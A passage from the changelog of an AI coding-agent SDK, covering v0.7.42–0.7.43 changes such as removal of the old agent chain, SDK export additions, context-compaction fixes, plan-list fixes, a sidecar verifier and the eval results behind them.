(`ama-harness-selection*` 3 files + `eval-scout-*` 2 files + `feature-097-*` 2 files + `feature-114-scout-trivial-exemption.eval.ts`) + ADR-030 V1 retirement cross-reference; (6) this commit — post-review dead-code residual cleanup: `agent-chain.ts` `scoutDispatch` + `generatorDispatch` deletion (declared but never consumed after V1 chain agent removal), `verdict-recorder.ts` `wrapEmitterWithRecorder` slot type narrowed from union to `'verdict'` literal + dead `slot === 'scout'` / `'contract'` / `'handoff'` branches removed (scout todoStore seeding, contract replan-seed, scout pre-handoff write warning, scout budget-cap upgrade, `applyScoutDecisionToPlanRunner` propagation, multi-slot summary fallback) + unused imports pruned (`applyScoutDecisionToPlanRunner`, `BUDGET_CAP_BY_HARNESS`, `emitResilienceDebug`, `ManagedMutationTracker`) + `child-executor.ts` `validateWriteBundles` allow-list comment updated to clarify legacy `generator` + `H2_PLAN_EXECUTE_EVAL` parity branches survive only for test-surface continuity (production V2 Worker uses `tool-dispatch`). Test scope: 30 child-executor + 128 runner-driven/todo-store + 168 task-engine/_internal/managed-task tests all green; tsc clean. ~−139 net LoC across 3 files. **Aggregate impact**: ~−4500 LoC net deletion across ~30 files. **Zero runtime behavior change on V2 paths**: `KODAX_HARNESS_V2=true` route is byte-identical to pre-F193 (V2 is the only active route). The `KODAX_HARNESS_V2=false` env opt-out is silently ignored — won't break user shell configs but no longer routes through V1 (V1 deleted). V1 type union members (`harnessProfile: 'H0_DIRECT' | 'H1_EXECUTE_EVAL' | 'H2_PLAN_EXECUTE_EVAL' | 'PLANNED'`, `roleAssignments[].role: 'scout' | 'planner' | 'generator' | 'direct' | 'worker' | 'evaluator'`, `harnessTransitions`) survive as pre-1.0 SDK-surface vestigial fields — they're harmless (the runner no longer populates them on V1 values, so they become unreachable from runtime, but external SDK type consumers that destructure them aren't broken). Removal deferred to a future major-bump scope review. **Zero eval cost**: V1 is dead code; deletion needs no LLM judge. Pre-existing FEATURE_168 schema parity failures (6 tests) are unrelated F189 B.1 drift and remain — fix scheduled separately. Design doc: [docs/features/v0.7.43.md#feature_193-v1-chain-full-retirement](docs/features/v0.7.43.md#feature_193-v1-chain-full-retirement--scoutplannergenerator-chain-agents--entry-routing--v1-emit-tools).
- **FEATURE_190 — FEATURE_184 Cleanup Tail: Text-Only Termination + `emit_handoff` Tool Surface Removal + Evaluator Prompt Sweep** (9 commits `078d2e99` → `aefa12d1`, shipped 2026-05-23). FEATURE_184 (v0.7.45) retired the in-chain Evaluator role + made Worker/Generator terminal but left the `emit_handoff` tool + Worker `EVALUATOR HANDOFF` prompt block as load-bearing dead code (the tool was the V2 chain's *only* terminal signal — `detectIdleYield.hasEmittedHandoff = Boolean(recorder.handoff)` gated idle-yield exit). F190 is the cleanup tail. 5-phase plan: (0) `078d2e99` NIL-conflict plumbing (stall-sidecar suggest list / `tool-permission` case / `detectMissingTerminalVerdict` dead code); (1) `8b08d5c1` text-only termination canonical-path ratification (12 new tests + docstring updates); (2a) `5fa1c362` Worker/Generator prompt rewrite (TERMINATION block replaces EVALUATOR HANDOFF; `protocol-emitters.ts` description swaps "Evaluator" → "Sidecar Verifier"); (2b) `901a4c26` Layer 2 eval pilot driver; (2c) `0675d611` + `9ca593ef` 200-cell panel (5 alias × 4 case × 2 variant × 5 runs) + 3-judge LLM majority audit (zhipu/glm51 + ark/v4pro + kimi, panel-internal); (3) `4c296ad4` tool surface deletion (`handoffEmit` wrapper + FEATURE_165 pending-children gate logic + `emitHandoff` + `EMIT_HANDOFF_TOOL_NAME` + `PROTOCOL_EMITTER_TOOLS` 4→3 + barrel re-exports across `agents/index.ts` and `coding/src/index.ts` + `ROLE_EMIT_TOOL_NAMES` narrowed to scout+planner + `getEmitToolNameForRole` returns undefined for generator/worker + Generator-prompt `generatorReasoningDiscipline` reworded to drop the tool reference; 7 source files / +52 −178 LoC); (4) `d6ea1366` test rewrites (9 test files: protocol-emitters / coding-agents / runner-driven-tool-wiring / runner-driven / role-prompt / text-only-termination / parse-helpers / idle-yield + the Generator-prompt source change; +279 −717 LoC; 108 passed / 3 todo); (5) `aefa12d1` ship-status doc block in `docs/features/v0.7.43.md` + memory record. **Layer 2 SHIP gate evidence** (evidence-driven per `feedback_pre_registered_gate_saturation`): C1 (all-todos-completed) V_new 25/25 (100%) text-only + summary across all 5 alias; C2 (blocked-state) V_new 24/25 (96%); C3 (mid-task negative) + C4 (trivial completed positive) classified case-design-saturated (V_baseline also fails equally on those cases, V_new ≥ V_baseline on every alias so not a V_new regression); 3-judge audit reached **4.4% disagreement on drop-C4 set** (DATA VALID per EVAL_GUIDELINES anti-pattern 7 §3). C3+C4 case redesign scheduled v0.7.44. Cost ~$12 (pilot $0.30 + panel $10 + audit $1.50, under design-doc $13-15 budget). **Architectural payoff**: the FEATURE_165 pending-children gate's invariant survives via idle-yield — when Worker text-terminates with pending children, `detectIdleYield` returns true → runner waits + resumes Worker, same end-user observable as the rejected-tool-call gate, without an LLM ever calling a tool that needs to be rejected. The `recorder.handoff` slot / `IdleYieldSnapshot.hasEmittedHandoff` field / `Boolean(recorder.handoff)` reads in `runner-driven.ts` remain in the public type surface as vestigial (always-false post-Phase-3); removing them widens scope beyond F190 and is deferred. See [ADR-030](docs/ADR.md#adr-030-claudecode-shape-main-agent--sidecar-verifier-substrate-feature_184-v0745) §F190 cross-reference + [v0.7.43.md §FEATURE_190](docs/features/v0.7.43.md#feature_190-feature_184-cleanup-tail--text-only-termination--emit_handoff-tool-surface-removal--evaluator-prompt-sweep).

## [0.7.42] - 2026-05-21

### Theme

**SDK Embedder Surface Closure + Compaction Systemic Fixes + Plan-List Resilience + Hits Ledger** — Four parallel work streams converge on v0.7.42. **FEATURE_186** (this cycle's headline external-facing item) closes the 10-gap export list reported by KodaX Space (downstream SDK consumer on v0.7.40) plus the MCP popout design request: build-dts CI guard against `@kodax-ai/*` internal-import leaks in entry `.d.ts`, one-liner re-exports for `bootstrapAutoMode` / `loadCommands` / `getAgentConfigHome` etc., a Skill `!cmd` dynamic-context host hook (`executeDynamicContext?` + `disableDynamicContext?`), declarative `ToolSideEffect` metadata on all 51 built-in tools with metadata-driven plan-mode gate (kills the `acp_server.ts` hardcoded `Set(['write','edit'])`), Custom provider + MCP server CRUD against `~/.kodax/config.json` with dynamic `getAgentConfigPath` resolution (no frozen `KODAX_CONFIG_FILE`), a new non-blocking `startKodaX(opts, prompt): RunningSession` entry exposing mid-run `setProvider` / `setModel` / `setReasoning` / `abort` (CAP-055 per-turn re-resolution picks up the new values on the next turn), and a sixth SDK subpath `@kodax-ai/kodax/mcp` for popout consumers who only need the MCP layer. **FEATURE_177→FEATURE_183 + FEATURE_185** address compaction systemic regressions surfaced by long-running kimi-loop investigations: read-file-state cache (F177), L2 stall-detector sidecar (F178, 4 commits), AMA compaction trigger parity at top-of-loop ([ADR-029](docs/ADR.md#adr-029-ama-compaction-trigger-parity--top-of-loop-feature_179-v0742)), repo-intelligence system-message dedup (F180), empty-summary-must-not-overwrite-real-prior (F181), fast-path requires non-empty `previousSummary` (F182), `PROTECTED` whitelist 1→26 (F183, claudecode parity), and hits-ledger enrichment that preserves grep / glob / bash result-side artifacts across microcompact ([ADR-031](docs/ADR.md#adr-031-task-level-hits-ledger-与-cross-session-memdir-分层独立feature_185-v0742)). **FEATURE_175** ships two of three plan-list fixes (id-preserve on `op:'init'` + B2 synth `autoCompleteOnAccept`); the dirty-reject prototype was REVERTED post-eval after zhipu's intent-vs-action floor failed pre-registered SHIP gate (b). **FEATURE_173** lands the public session-management SDK surface + the `runner-${epoch}` ghost-session double-write fix that produced parallel `runner-*.jsonl` files since v0.7.36. Several **claudecode-parity surface polishes** also ship in this cycle: dedicated `skill` tool replaces read-SKILL.md invocation, multimodal `tool_result` for the read tool with image-aware compaction, `todo_get` tool, `subject` / `description` schema split, plan-list staleness refresh + dedup scan, ark-coding adds `deepseek-v4-{flash,pro}`. **FEATURE_094 (Deep Anti-Escape Hardening) was CANCELLED 2026-05-19** after the necessity probe measured 0/43 escape across the canonical 5-alias panel — the post-v0.7.26 layered defense (P0 prompt + P2a multi_edit + P2b cap) plus FEATURE_152 (bash AST) + FEATURE_158 (signal classifier) + FEATURE_169 (pull-tool prompt) absorbed the bypass surface. The probe is retained as a permanent regression sweep (`tests/feature-094-necessity-probe.eval.ts`) — escape rate must stay 0%; >5% re-opens FEATURE_094.

### Added

- **FEATURE_186 — SDK Embedder Surface Closure (KodaX Space Gap List + MCP Popout)**. **8 atomic commits across 8 phases** (Phase 1 `2e33b681` build-dts CI guard / Phase 2 `d3ab38b0` 一行 export 集 / Phase 3 `9b1e440f` Skill `!cmd` host hook / Phase 4 `7defd65f` Tool side-effect metadata + metadata-driven plan-mode gate / Phase 5 `ee549d6f` Custom provider CRUD / Phase 6 `9ba68f25` `RunningSession` + `sessionControl` / Phase 7 `523e9a28` MCP server CRUD + `@kodax-ai/kodax/mcp` subpath / **Phase 8 `McpManager` popout-shape API**). Closes the 10 export gaps + MCP popout design request reported by KodaX Space (substrate consumer on `@kodax-ai/kodax@0.7.40`). Three categories: (1) **SDK publish hazards** — entry `.d.ts` bundle no longer leaks `@kodax-ai/*` internal imports; `build-dts.mjs` self-tests against POSITIVE/NEGATIVE samples + hard-asserts via grep on each entry `.d.ts`. (2) **Barrel re-exports** — Space no longer maintains parallel implementations: `bootstrapAutoMode`, `loadCommands`, `KODAX_COMMANDS_DIR`, `processCommandCall`, `parseCommandCall`, `getAgentConfigHome` / `Path`, `setAgentConfigHome`, new `getAppDataDir(appId)` (with reserved-name guard `^[a-z][a-z0-9-]{1,31}$`, rejects `kodax-*` prefix), `validateCustomProviderConfig`, `ToolSideEffect` enum + 4 helpers (`getAllRegisteredTools` / `isToolPlanModeAllowed` / `isToolFileMutation` / `isToolMutation`) all surface through the SDK barrel. (3) **Runtime hooks** — Skill `!cmd` execution gets a 3-tier dispatch (host `executeDynamicContext?` hook → `disableDynamicContext?` throws → legacy `execSync`); `runKodaX` gains a non-blocking sibling `startKodaX(opts, prompt): RunningSession` with `id` / `currentProvider/Model/Reasoning` getters, `setProvider` / `setModel` / `setReasoning` setters (queue + replay on pre-attach, direct mutation post-attach; CAP-055 reads the live `RuntimeSessionState` on next turn), `abort(reason?)` via internal `AbortController` (forwards external `options.abortSignal`), and `result` Promise pass-through. Plan-mode gate is now metadata-driven: `LocalToolDefinition.sideEffect: 'readonly' | 'mutates-fs' | 'mutates-shell' | 'mutates-network' | 'mutates-state'` is required, optional `planModeAllowed?: boolean` whitelists per-tool; 51 built-in tools labeled (22 readonly / 12 mutates-fs / 1 mutates-shell / 5 mutates-network / 12 mutates-state); `acp_server.ts`'s hardcoded `Set(['write','edit'])` replaced by `isToolFileMutation`. Custom provider CRUD (`list/get/upsert/removeCustomProvider`) and MCP server CRUD (`list/get/upsert/remove/validateMcpServerConfig`) own `~/.kodax/config.json` end-to-end, with `getAgentConfigPath('config.json')` resolved on every call (no frozen `KODAX_CONFIG_FILE` constant — `setAgentConfigHome()` overrides take effect immediately). The new `@kodax-ai/kodax/mcp` subpath re-exports `@kodax-ai/mcp` only (~0 kB + shared chunks); popout consumers pull MCP without the full coding bundle. **Phase 8 added after KodaX Space reported Phase 7's `/mcp` only exposed "types + helpers, no manager-shape API"**: new `McpManager` class + `createMcpManager(servers, options?)` factory expose `listServers / startServer / stopServer / getServerLogs / listTools` popout operations plus `provider() / execute / describe / search / read / dispose` escape hatch. Internally wraps one `McpCapabilityProvider`; `McpCapabilityProvider` gains two readonly accessors (`getServerIds()` + `getRuntime(id)`) so manager can read the active runtimes Map without re-constructing them — capability-provider API (the substrate-facing shape) stays fully backwards-compatible. **158 new unit tests** across 8 phases (Phase 8 = 20 manager tests against a real MCP stdio JSON-RPC fixture). Design doc: [docs/features/v0.7.42.md#feature_186-sdk-embedder-surface-closure--kodax-space-gap-list--mcp-popout](docs/features/v0.7.42.md#feature_186-sdk-embedder-surface-closure--kodax-space-gap-list--mcp-popout). Architecture: [ADR-032](docs/ADR.md#adr-032-sdk-embedder-surface-closure-feature_186-v0742).
- **FEATURE_173 — Session Management Public SDK + `session.id` Propagation Bug Fix** (commit `a8258d29` implementation; `ac2752a4` design relocation). New `packages/repl/src/session/public-api.ts` thin facade over `FileSessionStorage`; exposes `listSessions({ projectRoot, scope, includeArchived, limit, before })` / `loadSession` / `forkSession` / `rewindSession` / `setActiveEntry` / `deleteSession` / `listRunningSessions` / `watchSessions(cb)` + `createSessionManager({ sessionsDir })` factory via `@kodax-ai/kodax/session` (`dist/sdk-session.js` 731 B + `dist/sdk-session.d.ts` 5.9 KB in tarball). Running-session lock reuses FEATURE_125 team-mode `<configHome>/instances/<pid>/` heartbeat; mutation against a running session returns `{ error: { code: 'session_running', runningProcess: { pid, startedAt } } }` (never throws). Platform-branched `watchSessions`: POSIX `fs.watch` + 100ms debounce coalesce / Windows 1000ms polling (cross-process file creation on Windows fs.watch is unreliable). **13 stable-contract tests** total (12 Part B + 1 Part A) pin `SessionSummary` field names + `forkSession` never-throws semantics + running gate + watch coalesce. **Part A bug fix**: `runManagedTask` call chain dropped `opts.session.id` between `runWithIdleYield` → `primitives/runner.ts`, so the `effectiveRunResult.sessionId ?? \`runner-${Date.now()}\`` resolution at `runner-driven.ts:1965` always fell to the right-hand fallback, producing duplicate `runner-*.jsonl` files (synthesized id) alongside the canonical `YYYYMMDD_HHMMSS.jsonl` (REPL-side). 5-LoC fix prepends `options.session?.id` to the `??`-chain; `FEATURE_173 Part A` contract test locks "caller id wins, ghost-prefix never appears" forever. Out of scope (deferred to v0.7.43): `listRunningSessions().sessionId` field reserved but unpopulated (needs FEATURE_125 heartbeat schema bump to write sessionId into state.json — deleteSession running-gate matches by pid for v0.7.42); `createSessionManager({sessionsDir})` accepts but ignores `sessionsDir` (FileSessionStorage hardcodes `KODAX_SESSIONS_DIR`); old `runner-*.jsonl` cleanup deferred to FEATURE_174 `kodax sessions dedupe`. Design doc: [docs/features/v0.7.42.md#feature_173-session-management-public-sdk--sessionid-propagation-bug-fix](docs/features/v0.7.42.md#feature_173-session-management-public-sdk--sessionid-propagation-bug-fix).
- **FEATURE_184 — Sidecar Verifier Substrate (claudecode-Shape Main Agent + Stop Hook Primitive)**. Originally drafted as v0.7.45; shipped to v0.7.42 release window 2026-05-21 with full SHIP gate (a)+(b)+(c)+(d) MET on Phase D.4 Layer 2 eval (100/100 primaryPassed; 0% LLM-judge audit disagreement on 20-cell random sample). Retires the AMA H2 Worker→Evaluator role state machine in favor of claudecode-style single-loop Main Agent + agent-layer `StopHookFn` primitive + out-of-chain Sidecar Verifier. Resolves the zhipu/glm51 intent-vs-action floor that made FEATURE_167 B2 synth-accept fallback silently no-op the verification gate. **Net delete ~423 LoC** across `EVALUATOR_AGENT_NAME` / `emit_handoff` / `verdict-recorder` evaluator branches / F165/166/167 dead retry paths. New module `packages/coding/src/agent-runtime/middleware/sidecar-verifier/` (5 files, ~200 LoC impl + ~250 LoC test); sidecar context = current-turn user queries + 24-msg rolling buffer + file-edit summary (must see what main agent **did**, not only what it **said**); model default-inherits main agent, with `KODAX_VERIFIER_PROVIDER` / `KODAX_VERIFIER_MODEL` env-var opt-in for cross-family decoupling. UI surface: `⊙ Verifying...` dim spinner + `↻ Retrying: <reason>` + `⚠ Cannot verify: <reason>` (per claudecode `hook_stopped_continuation` style). See [ADR-030](docs/ADR.md#adr-030-claudecode-shape-main-agent--sidecar-verifier-substrate-feature_184-v0745). Design doc: [docs/features/v0.7.42.md#feature_184-sidecar-verifier-substrate--claudecode-shape-main-agent--stop-hook-primitive](docs/features/v0.7.42.md#feature_184-sidecar-verifier-substrate--claudecode-shape-main-agent--stop-hook-primitive).
- **FEATURE_175 — Plan-List Resilience: `op:'init'` Mid-Task Status Preservation + B2 Synth Auto-Completion** (commit `1368ce55` + dirty-reject revert markers). Based on 2026-05-19 production session where V2 PLANNED ran 12m54s but plan stayed at `0/4 completed`. Three independent bugs stacked: (1) `todo-store.ts:218-237` `init()` unconditionally reset status to pending — Worker mid-task `op:'init'` refine-scope wiped prior completed/skipped/cancelled; (2) FEATURE_167 (v0.7.41) B2 synth fallback directly assigned `recorder.verdict` property, bypassing the `wrapEmitterWithRecorder` slot setter, so `autoCompleteOnAccept` never fired — run accepted, UI froze at `0/N completed`; (3) `executeInitOp` had no dirty-store guard, magnifying (1). **Slice 1 prototype** three fixes same version: (a) `init()` id-match terminal-success preserve (keeps completed/skipped/cancelled + note, new ids pending, pending/in_progress/failed reset) SHIPPED; (b) B2 synth path now mirrors wrapper side-effect via `todoStore.autoCompleteOnAccept()` SHIPPED; (c) `executeInitOp` returns `{ok:false, reason:"... use surgical APIs ..."}` on non-pending store contents — **PROTOTYPED → eval-driven REVERTED** after Layer 2 panel (51 calls = 1 pilot + 50 phase1, ~$3) showed zhipu/glm51 0/10 PASS on C1+C2 with audit disagreement 0% (real [project_zhipu_send_message_floor](../../../memory/project_zhipu_send_message_floor.md) intent-vs-action floor: "明白，用 todo_create 插入新步骤：" prose-without-tool); pre-registered SHIP gate (b) hard-fail → REVERT. Reverted code retained as revert-pin tests + marker comments. Slice 2: +6 net tests (4 todo-store + 1 todo-update revert-marker + 1 runner-driven integration); coding 2704/2704 + repl 1431/1432 green. Design doc: [docs/features/v0.7.42.md#feature_175-plan-list-resilience--opinit-mid-task-status-preservation--b2-synth-auto-completion](docs/features/v0.7.42.md#feature_175-plan-list-resilience--opinit-mid-task-status-preservation--b2-synth-auto-completion).
- **FEATURE_177 — Read-File-State Cache (anti-loop)** (commit `8e64e09e` + `c66e2403` post-compact fire). Per-task LRU keyed by absolute path stores `{ mtime, size, hash }` for files the worker has read; subsequent identical reads return cached envelope with a "still fresh — your prior read at turn N is current" banner, suppressing the kimi-loop "read file 4 times in a row" pattern observed in production. Cache invalidated on tool-side mutation (write / edit / multi_edit / insert_after_anchor) and on cross-microcompact boundaries via `onPostCompact` (fixed in `c66e2403` to fire on microcompact-only changes, not just full compactions). Design doc: [docs/features/v0.7.42.md#feature_177-读文件状态缓存read-file-state-cache--抑制非必要重复读取](docs/features/v0.7.42.md#feature_177-%E8%AF%BB%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81%E7%BC%93%E5%AD%98read-file-state-cache--%E6%8A%91%E5%88%B6%E9%9D%9E%E5%BF%85%E8%A6%81%E9%87%8D%E5%A4%8D%E8%AF%BB%E5%8F%96).
- **FEATURE_178 — L2 Stall Sidecar (Rule + LLM dual-layer anti-loop detector)** (4 commits `e79008c1` → `f91cf7cb` → `9bc209f9` → `d9c52638`). L1 (rule layer): standalone stall detector module scans the last N turns for repeat tool-call signatures (same name + same input keys); fires when ≥3 identical calls in N=5 turns. L2 (LLM sidecar): on L1 fire, dispatches a sidecar LLM judge with the recent turn window + a stall-classification system prompt; returns `{ stalled: true|false, reason }` deterministically parseable. Control plane: orchestrator + nudge injection prepends `<stall-detector>` system reminder to the next user message when L2 confirms; rule-only mode (no LLM) available via `KODAX_STALL_SIDECAR=rule`. Design doc: [docs/features/v0.7.42.md#feature_178-l2-stall-sidecar--rule--llm-双层反-loop-检测](docs/features/v0.7.42.md#feature_178-l2-stall-sidecar--rule--llm-%E5%8F%8C%E5%B1%82%E5%8F%8D-loop-%E6%A3%80%E6%B5%8B).
- **FEATURE_179 — AMA Compaction Trigger Parity (Top-of-Loop)** (commit `02836a72`, see [ADR-029](docs/ADR.md#adr-029-ama-compaction-trigger-parity--top-of-loop-feature_179-v0742)). Moves the AMA compaction hook from end-of-turn to top-of-loop, mirroring SA path's `runCompactionLifecycle` ordering. Pre-fix: AMA path called compaction AFTER the new user message landed in the transcript, so the trigger metric saw the next-turn budget already eaten — compaction either fired too late (already over) or skipped (transcript estimate sub-threshold but post-merge over). Post-fix: hook runs BEFORE the next-turn LLM call, against the pre-merge transcript state, matching SA path semantics. Design doc: [docs/features/v0.7.42.md#feature_179-ama-compaction-trigger-parity--top-of-loop-触发](docs/features/v0.7.42.md#feature_179-ama-compaction-trigger-parity--top-of-loop-%E8%A7%A6%E5%8F%91).
- **FEATURE_180 — Repo-Intelligence System Message Dedup** (commit `e1782ffe`). Repo-intel capsule injection (FEATURE_161 v0.7.40) could land identical system messages across rounds when topology / module / impact signals were stable; dedup by content hash keeps one copy. Design doc: [docs/features/v0.7.42.md#feature_180-repo-intelligence-system-message-dedup](docs/features/v0.7.42.md#feature_180-repo-intelligence-system-message-dedup).
- **FEATURE_181 — Empty LLM Summary Must Not Overwrite Real Prior Summary** (commit `57a79767`). When the compaction LLM call returns empty / whitespace-only / API error, the prior `summary` (if non-empty) is preserved instead of overwritten with `""`. Closes a kimi-loop-adjacent case where a single compaction failure wiped the entire compacted history. Design doc: [docs/features/v0.7.42.md#feature_181-empty-llm-summary-不再覆盖-real-prior-summary](docs/features/v0.7.42.md#feature_181-empty-llm-summary-%E4%B8%8D%E5%86%8D%E8%A6%86%E7%9B%96-real-prior-summary).
- **FEATURE_182 — Compaction Fast-Path Requires Non-Empty `previousSummary`** (commit `d67aa776`). The compaction fast-path (skip LLM, reuse prior summary + new turn delta) gated on `previousSummary` length > 0; cold-start sessions correctly fall through to full LLM compaction. Design doc: [docs/features/v0.7.42.md#feature_182-compaction-fast-path-必须有-previoussummary-才能复用](docs/features/v0.7.42.md#feature_182-compaction-fast-path-%E5%BF%85%E9%A1%BB%E6%9C%89-previoussummary-%E6%89%8D%E8%83%BD%E5%A4%8D%E7%94%A8).
- **FEATURE_183 — PROTECTED Tool Whitelist Expansion (1 → 26, claudecode parity)** (commits `f6a51be2` + `c322d835` review-amend). `PROTECTED` tools are exempted from compaction's "clear tool_result content" step (the tool's structured payload survives across compact boundaries); pre-fix only `read` was on the whitelist. Expanded to 26 tools matching claudecode's parity set: `read`, `write`, `edit`, `multi_edit`, `glob`, `grep`, `bash`, `todo_create`, `todo_update`, `todo_list`, `todo_get`, `web_search`, `web_fetch`, `task`, `dispatch_child_task`, `ask_user_question`, `emit_verdict`, `emit_handoff`, `module_context`, `symbol_context`, `process_context`, `impact_estimate`, `worktree_create`, `worktree_remove`, `exit_plan_mode`, `skill`. Design doc: [docs/features/v0.7.42.md#feature_183-protected-工具白名单扩容--claudecode-对照修正](docs/features/v0.7.42.md#feature_183-protected-%E5%B7%A5%E5%85%B7%E7%99%BD%E5%90%8D%E5%8D%95%E6%89%A9%E5%AE%B9--claudecode-%E5%AF%B9%E7%85%A7%E4%BF%AE%E6%AD%A3).
- **FEATURE_185 — Tool Result-Side Enrichment: Hits Ledger Cross-Compaction Preservation** (5 commits `15b1ea3c` → `83976149` → `da8d7b28` → `bddc3d58` + `fcd4cc76` docs, see [ADR-031](docs/ADR.md#adr-031-task-level-hits-ledger-与-cross-session-memdir-分层独立feature_185-v0742)). `KodaXSessionArtifactLedgerEntry` extraction now reads `tool_result.content` (not just `tool_use.input`) for grep / glob / bash entries — grep gains `hits: Array<{ path, line, preview? }>` up to 50 per entry, glob gains `paths: string[]`, bash gains `exit_code` + `tail` (last 240 chars). Metadata-aware merge keystone: when microcompact clears the raw `tool_result.content` to `[Cleared: ...]` placeholder, the ledger summary in the post-compact attachment still shows "you found 12 hits at module/foo.ts:23, 45, 78 / module/bar.ts:12" so the model knows what the prior grep found without re-running it. 5-alias × 2-case × 5-run Layer 2 panel: 5/5 alias ≥80% (gate met). Design doc: [docs/features/v0.7.42.md#feature_185-工具结果侧-enrichment--hits-ledger-跨压缩保留](docs/features/v0.7.42.md#feature_185-%E5%B7%A5%E5%85%B7%E7%BB%93%E6%9E%9C%E4%BE%A7-enrichment--hits-ledger-%E8%B7%A8%E5%8E%8B%E7%BC%A9%E4%BF%9D%E7%95%99).
- **claudecode-parity polish: dedicated `skill` tool** (commit `09e84aaf`). Replaces "read the SKILL.md file via Read tool" pattern with a dedicated `skill` tool that returns the skill body + metadata in one call. Matches claudecode V2 skill invocation surface.
- **claudecode-parity polish: `todo_get` tool** (commit `35b93cd7`). Single-task fetch by id, matches V2 TaskGet parity.
- **claudecode-parity polish: `subject` / `description` split on todo items** (commit `0833aeb7`). Two-field schema matching V2 — `subject` for the short title, `description` for the elaboration. Compatibility shim: legacy `content` field still accepted on input, mapped to `subject` server-side.
- **Plan-list metadata per-key delete** (commit `9094edda`). `todo_update` patch operation gains granular metadata delete (set value to `null` clears the key); previously the only way to clear metadata was full overwrite.
- **Plan-list hygiene — staleness refresh + dedup scan** (commit `a7748bbb`). Stale items (status pending for >N turns) get a system-reminder nudge; dedup scan flags subject-collisions across active items.
- **Deprecate LLM-side `op:'init'`** (commit `3f06330b`). `todo_create` batch is the canonical creation path going forward; LLM-side `op:'init'` remains backward-compatible but emits a deprecation hint in the tool response.
- **Verification nudge: `todo_update` reminder on terminal-completion transition** (commit `c9a3fe91`). When `todo_update` flips an item to `completed`, the tool response now appends a brief verification reminder ("verify you actually completed this; if not, set status back to in_progress").
- **`@kodax-ai/llm` ark-coding gains `deepseek-v4-{flash,pro}` (1M ctx)** (commit `c312e899`). Updates the canonical eval alias panel to use coding-plan provider variants (see `feedback_canonical_eval_alias_panel`).
- **Two-layer cascade for `replay` / `strict` / `streamMax`** (commit `a7615d54`). Custom provider parity with built-in providers' two-layer config resolution (provider default ← user override).
- **FEATURE_188 — claudecode-Parity dispatch_child Architecture: Drop Forced Worktree + Prompt-Level Conflict Awareness** (see [ADR-034](docs/ADR.md#adr-034-claudecode-parity-dispatch_child-architecture--drop-forced-worktree--prompt-level-conflict-awareness-feature_188-v0742)). Surfaced after FEATURE_177 panel #2 dump showed 0/250 real binding dispatches in `dispatch_child_task` C4 (read fan-out) + C5 (write fan-out) cells — model writing `<tool>dispatch_child_task</tool>` markup in narrative without invoking the structured tool. Three dead-assumption fixes: (1) `executeWriteChild` no longer creates a worktree — share parent `executionCwd` / `gitRoot`, per-file `backups` Map remains the rollback substrate. (2) Worker `dispatchRules` swaps `≥3 independent investigations` / `≥45 seconds` / `≥3 modules` for `multiple independent investigations` / `a while` / `multiple modules` (qualitative criteria per [ADR-033](docs/ADR.md#adr-033-claudecode-style-prompt-design-principles--qualitative-criteria-over-quantitative-rules-v0742-v0743) §1; pilot v3 isolation test 20 calls verified non-load-bearing). (3) RULE C drops `Worktrees are isolated; merge happens at Evaluator review time` — the Evaluator role was retired in FEATURE_184 v0.7.45 ([ADR-030](docs/ADR.md#adr-030-claudecode-shape-main-agent--sidecar-verifier-substrate-feature_184-v0745)). Write children's `buildChildBriefing` now carries a `## Coordination with peers` section instructing them to STOP-and-report if peer-conflict cannot be ruled out (read children's briefing intentionally omits this — they don't write files). Cross-package infrastructure (`childWriteWorktreePathsRef` ref + `registerChildWriteWorktrees` callback + `childWriteWorktreePaths` payload field + `worktreePaths` ReadonlyMap type, 4 type-decl + 4 plumbing sites across `child-executor.ts` / `runner-driven.ts` / `dispatch-child.ts` / `payload-builder.ts` / `types.ts`) all retired. CAP-097 contract test deleted (worktree-creation product behavior gone); CAP-095 / CAP-096 / `child-executor.test.ts` mocks + assertions updated. Design doc: [docs/features/v0.7.42.md#feature_188-dispatch_child-worktree-drop--conflict-awareness-prompt-hardening](docs/features/v0.7.42.md#feature_188-dispatch_child-worktree-drop--conflict-awareness-prompt-hardening).

### Fixed

- **FEATURE_177 follow-up: read-file-state cache fires on microcompact-only changes** (commit `c66e2403`). Pre-fix the `onPostCompact` listener only fired on full compactions; microcompact-only iterations left stale cache entries. Now both microcompact and full compaction invalidate the per-task cache.
- **`dispatch_child_task` empty-summary fallback + opt-in trace** (commit `8c17dba4`). Child task that exited with empty summary previously fell through `??` to a default banner that read like a real summary; now produces a "no summary returned" diagnostic envelope with `mode=silent-drop` so the parent worker can react. Opt-in trace via env-gated logging.
- **`dispatch_child_task` review pass — flaky test + minor cleanups** (commit `3b5a862f`). Stabilizes one flaky test in the child-task harness and clears a handful of LOW-severity review items.
- **Shift-Tab cycle uses canonical `'auto'`** (commit `1b513824` + revert chain `32396db8` → `3637bcec`). Closes the Windows-SSH cursor-misalignment root cause. The follow-up revert `3637bcec` restored the `aliasedCurrent` mapping after `32396db8` was challenged by the user — semantic intent (explicit `auto-in-project ≡ auto`) ≠ behavior equivalence (`indexOf=-1` fallback); the original mapping is load-bearing. See `feedback_behavioral_vs_semantic_equivalence` memory.
- **FEATURE_172 `Output.width` viewport-sync attempt** (commits `fabe0b4f` + revert `e62312b3`). Same-cycle revert, retrospectively classified as a **misjudged hypothesis** — no real ghost-cell bug to fix. FEATURE_172 main scope (Phase 1 data layer + Phase A.1 ScreenBuilder) remains CLOSED with no v0.7.43+ follow-up.
- **REPL queue layout — budget reserves N+1 rows for `QueuedCommandsSurface`** (commit `f4267d4d`). The queue surface was 1 row short of its actual rendered height in tight terminals, causing trailing ellipsis cutoff.
- **Compaction preserves image blocks + counts image tokens** (commit `92b11e68`). Image blocks were silently dropped during summary roll-up; now preserved verbatim and their estimated tokens included in the total.
- **REPL drops `[Image #N]` anchor from user-message text** (commit `1eac821d`). Pre-fix the visible user-message text carried both the image block and a redundant `[Image #N]` anchor string; claudecode parity removes the text anchor since the image block itself is the canonical reference.
- **Read tool image-aware via multimodal `tool_result`** (commit `286c16db`). Reading an image file (`.png` / `.jpg` / `.webp` etc.) now returns the binary as an image-content block in the tool_result, not as a base64 string in text; claudecode parity.
- **`loadCompactionConfig` uses per-model `contextWindow` for adaptive `triggerPercent`** (commit `0cef1b66`). Pre-fix the trigger percentage was computed against the legacy hard-coded 200k context window; now reads the per-model `contextWindow` (e.g., 1M for `glm-5-turbo` corrected in `5324889e`, 200k for Claude Sonnet 4.x) so the 60% trigger threshold scales correctly.
- **Status bar `contextWindow` re-resolves on `/model` swap** (commit `c9f62030`). Pre-fix the status-bar contextWindow value was captured at REPL bootstrap; switching models mid-session left the bar showing the stale value.
